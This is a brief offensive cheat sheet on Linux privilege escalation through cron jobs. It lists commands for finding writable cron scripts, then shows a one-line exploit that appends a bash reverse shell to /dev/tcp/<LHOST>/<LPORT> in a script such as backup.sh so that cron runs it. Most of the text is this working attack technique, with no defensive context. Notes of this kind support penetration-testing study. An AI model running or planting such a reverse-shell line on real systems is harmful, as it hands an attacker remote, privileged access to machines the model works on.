# Cron Jobs

## Detection

crontab -l
ls -la /etc/cron*

Look for writable scripts.

## Exploitation

Modify script executed by cron.

Example:

echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" >> backup.sh

## Verification

Wait for cron execution.
